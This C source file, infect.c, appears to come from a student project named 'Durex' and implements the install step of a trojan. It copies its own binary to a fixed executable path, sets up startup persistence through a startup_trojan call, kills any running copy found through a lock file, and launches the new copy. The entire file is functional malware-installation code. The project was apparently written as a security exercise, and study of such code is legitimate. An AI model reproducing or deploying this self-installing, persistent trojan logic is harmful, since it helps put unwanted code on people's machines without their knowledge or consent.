/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   infect.c                                           :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: mdufaud <mdufaud@student.42.fr>            +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2018/05/17 17:38:17 by mdufaud           #+#    #+#             */
/*   Updated: 2018/05/20 21:45:01 by mdufaud          ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "durex.h"
#include <errno.h>
#include <fcntl.h>
#include <sys/types.h>
#include <signal.h>
#include <sys/file.h>

int				execute_durex(void)
{
	int		err;

	err = my_system(EXE_PATH);
	if (err != 0)
		return (0);
	return (1);
}

static int		copy_content(int fd_r, int fd_w)
{
	char	buf[BUFF_SIZE + 1];
	int		ret;
	int		wrote;

	wrote = 0;
	while ((ret = read(fd_r, buf, BUFF_SIZE)) > 0)
	{
		buf[ret] = 0;
		write(fd_w, buf, ret);
		wrote += ret;
	}
	close(fd_r);
	close(fd_w);
	return (wrote);
}

static int		is_flock(void)
{
	int		fd;

	if ((fd = open(LOCK_PATH, O_RDONLY)) < 0)
		return (-1);
	if (flock(fd, LOCK_EX | LOCK_NB) == -1)
	{
		if (errno == EWOULDBLOCK)
		{
			close(fd);
			return (1);
		}
	}
	else
		flock(fd, LOCK_UN);
	close(fd);
	return (-1);
}

static void		remove_durex(void)
{
	int		ret;
	int		fd;
	char	buf[100 + 1];
	int		pid;

	remove_trojan_files();
	if (is_flock() && (fd = open(LOCK_PATH, O_RDONLY)) >= 0)
	{
		if ((ret = read(fd, buf, 100)) > 0)
		{
			buf[ret] = 0;
			pid = ft_atoi(buf);
			if (pid > 0)
				kill(pid, SIGTERM);
			if (pid > 0)
				sleep(1);
		}
		else
			my_kill(EXE_PATH, SIGKILL);
	}
	else
		my_kill(EXE_PATH, SIGKILL);
}

int				duplicate_bin(char *bin)
{
	int		fd_r;
	int		fd_w;
	int		ret;

	ret = 0;
	if (access(EXE_PATH, F_OK) >= 0 || is_flock())
		remove_durex();
	fd_r = open(bin, O_RDONLY);
	fd_w = open(EXE_PATH, O_CREAT | O_TRUNC | O_WRONLY, 0700);
	if (fd_r > 0 && fd_w > 0 && startup_trojan() &&
		copy_content(fd_r, fd_w) && execute_durex())
		ret = 1;
	else
		remove_durex();
	close(fd_r);
	close(fd_w);
	return (ret);
}
